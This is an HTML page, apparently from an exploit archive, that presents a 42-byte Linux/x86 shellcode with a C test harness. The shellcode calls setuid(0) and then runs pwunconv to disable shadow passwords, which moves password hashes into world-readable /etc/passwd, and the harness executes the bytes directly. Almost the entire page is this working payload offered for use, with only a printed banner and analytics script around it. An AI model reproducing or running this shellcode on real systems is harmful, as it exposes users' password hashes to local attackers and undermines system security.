<html><head><title>Linux/x86 - disables shadowing - 42 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;

const char sc[]= &quot;\x31\xdb&quot; //xor ebx,ebx
                 &quot;\x8d\x43\x17&quot; //LEA eax,[ebx + 0x17] /LEA is FASTER than push and pop!
                 &quot;\x99&quot; //cdq
                 &quot;\xcd\x80&quot; //int 80 //setuid(0) shouldn't returns -1 right? ;)
                 &quot;\xb0\x0b&quot; //mov al,0bh
                 &quot;\x52&quot; //push edx /Termina la cadena con un 0
                 &quot;\x68\x63\x6f\x6e\x76&quot; //push dword &quot;conv&quot;
                 &quot;\x68\x70\x77\x75\x6e&quot; //push dword &quot;pwun&quot;
                 &quot;\x68\x62\x69\x6e\x2f&quot; //push dword &quot;bin/&quot;
                 &quot;\x68\x73\x72\x2f\x73&quot; //push dword &quot;sr/s&quot;
                 &quot;\x68\x2f\x2f\x2f\x75&quot; //push dword &quot;///u&quot;
                 &quot;\x89\xe3&quot; //mov ebx,esp
                 &quot;\x89\xd1&quot; //mov ecx,edx
                 &quot;\xcd\x80&quot;; //int 80h

void main()
{
  printf(&quot;\n~ This shellcode disables shadowing on a linux system ~&quot;
         &quot;\n\n\t ~ Coded by vlan7 ~&quot;
         &quot;\n\t ~ http://vlan7.blogspot.com ~&quot;
         &quot;\n\n ~ Date: 4/Jul/2009&quot;

         &quot;\n\tYou'll have the passwords stored in /etc/passwd.&quot;
		 &quot;\n\tFor undo purposes use the pwconv command.&quot;
         &quot;\n\t ~ Cheers go to: Wadalbertia&quot;
         &quot;\n\t ~ Shellcode Size: %d bytes\n\n&quot;,
                sizeof(sc)-1);

        (*(void (*)()) sc)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
